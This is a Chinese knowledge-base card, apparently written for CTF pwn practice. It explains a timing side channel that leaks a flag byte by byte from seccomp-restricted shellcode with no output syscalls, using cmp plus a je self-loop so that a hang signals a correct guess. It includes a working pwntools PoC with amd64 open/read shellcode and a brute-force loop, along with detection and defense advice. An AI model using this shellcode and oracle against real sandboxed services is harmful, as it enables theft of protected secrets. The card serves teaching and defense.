---
id: binary-pwn-sandbox-escape-shellcode-cmp-timeout-oracle
title: 无输出 shellcode 逐字符侧信道：cmp 猜测字节 + je 自循环制造超时
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: shellcode-cmp-selfloop-timeout-oracle
tags:
- binary
- pwn
- shellcode
- side-channel
- cmp
- je
- timeout
- seccomp
- orw
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:39:02+08:00'
  notes: 已对照原文 侧信道爆破/例题三 核对：cmp+je 自循环挂起、can_recv 超时区分正确字符、逐字符枚举；已将 PoC 中 can_recv 返回值注释修正为 True=有数据/EOF、False=超时无数据。原文无图，未在本机复跑。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-shellcode-cmp-timeout-oracle/
draft: false
kb_aliases:
- shellcode 侧信道
- cmp je 自循环
- 超时侧信道爆破 flag
- 无 write 输出
- je $-6 侧信道
- 逐字符爆破 shellcode
---

## 一句话结论

当 shellcode 能打开并读取 flag、但 `write` 等输出系统调用被禁用时，可以让 shellcode 逐字节把 flag 与猜测字符比较：相等就 `je` 跳回自身进入死循环，连接会一直挂起；不相等就继续执行并退出。攻击者用“超时/连接关闭”作为 oracle，每次猜一个字符，逐字节还原 flag。

## 原理

- **cmp + 条件跳转**：`cmp bl, guess` 计算 `bl - guess` 并设置标志位；`je` 在相等（ZF=1）时跳转。把 `je` 的目标设为 `cmp` 指令本身（`je $-N`，偏移按汇编器计算；也可用 `je $` 跳到自身），相等时进程进入无限循环，不再退出。
- **不相等则落空**：猜测错误时 `je` 不跳，执行流继续到 `exit` 或下一条指令，连接很快关闭。
- **观测差异**：父进程/攻击端用 `recv(timeout)` 或连接关闭检测区分两种情况——超时且连接仍存活代表“相等/挂起”，立即 EOF 代表“不相等”。
- **前置 open/read**：每个连接都是新进程，shellcode 先执行 `open("flag")` + `read(fd, buf, n)` 把 flag 读到固定缓冲区；再用 `mov bl, byte ptr [buf + index]` 取目标字节。
- **为什么不用输出**：`write`/`sendfile`/`splice` 可能被 seccomp 禁用，或 stdout 被关闭；侧信道只依赖进程是否继续运行，不需要任何输出系统调用。
- **字符集与效率**：每个候选字符需要一次新连接；字符集小（如已知前缀 `flag{`、候选 `1}`）时很快。字符集大时可把 `cmp/je` 换成大小比较 + 挂起/退出，做二分搜索；但要注意分支与超时的稳定性。
- **边界**：进程可能被外部超时/看门狗杀掉，导致“正确字符”也被误判为退出；需要让挂起时间明显长于观测窗口，或使用 `sleep` 循环。

## 触发条件

- 可执行任意 shellcode（RWX 页、函数指针调用等），且 flag 文件对进程可读。
- `open`/`read` 可用，`write` 等输出 syscall 被禁用或不可用。
- 攻击者能观测连接是否在超时窗口内保持/关闭（`recv(timeout)`、`can_recv`、`waitpid` 超时等）。
- 每个连接启动新进程、flag 内容稳定；字符集大小可接受。

## 利用步骤

1. 编写第一阶段 shellcode：`open("flag", O_RDONLY)` → `read(fd, buf, 0x100)`，把 flag 放在固定地址（如栈顶或 BSS）。
2. 对目标索引 i 和候选字符 c，追加比较逻辑：`mov bl, [buf+i]; cmp bl, c; je $`（或 `je` 跳回 `cmp`）。
3. 每次连接发送对应 shellcode；用 `can_recv(timeout=3)` 判断：超时未关闭 -> 猜中；立即 EOF -> 猜错。
4. 猜中后 `i += 1`，重新枚举候选字符；直到遇到 `}` 或达到最大长度。
5. 若字符集大，改用 `<`/`>` 比较 + 挂起/退出实现二分；或先泄漏字符类型缩小范围。

## PoC

```python
from pwn import *

context(arch="amd64", os="linux", log_level="error")
possible = [ord(c) for c in "0123456789abcdef}"]
flag = "flag{"
index = 5

# sd1：open("flag") + read(fd, buf, 0x100)
sd1 = asm('''
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    push 2
    pop rax
    syscall
    mov rdi, rax
    mov rsi, rsp
    xor edx, edx
    mov dl, 0x60
    xor eax, eax
    syscall
''')

while not flag.endswith("}"):
    for guess in possible:
        # sd2：比较第 index 字节；相等则 je 自循环
        sd2 = asm(f'''
            mov rax, rsp
            mov bl, byte ptr [rax+{index}]
            cmp bl, {guess}
            je $
            mov eax, 60
            xor edi, edi
            syscall
        ''')
        io = process("./chall")
        io.send(sd1 + sd2)
        has_data = io.can_recv(timeout=3)   # True=有数据/EOF（进程已退出）；False=超时无数据（猜中后死循环挂起）
        io.close()
        if not has_data:
            flag += chr(guess)
            print("current:", flag)
            break
    else:
        raise SystemExit("no candidate matched")
    index += 1

print(flag)
```

> `can_recv(timeout=3)` 的返回值语义按 pwntools 版本/目标行为调整：核心是区分“超时仍挂起”与“已关闭”。

## 变体与关联

- 变体：`je $-N` 跳回 `cmp` 形成循环，或用 `jne` 反转“正确/错误”的分支。
- 变体：用 `sleep`/`nanosleep`/长循环代替死循环，控制挂起时间，降低被看门狗误杀。
- 变体：用 `<`/`>` + `jb`/`ja` 做二分搜索，适合大字符集；或先比较长度/前缀。
- 关联卡片：[[binary-pwn-sandbox-escape-chroot-openat-fd-exit-status-sidechannel]]、[[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]、[[binary-pwn-stack-sigaltstack-ucontext-sigreturn-hijack]]。

## 检测与防御

- 检测：同一目标被大量短连接反复触发 shellcode，且部分连接长时间挂起；进程 CPU 占用异常但无输出。
- 检测：seccomp 只禁 write 而放行 open/read 的配置；shellcode 中出现 `cmp`+自循环模式。
- 防御：seccomp 同时限制 open/read，或把 flag 放在进程不可读的位置；对连接设置短超时并强杀挂起进程。
- 防御：限制每 IP 的连接频率/总尝试次数；对 shellcode 输入做长度/字节白名单，避免任意代码执行。
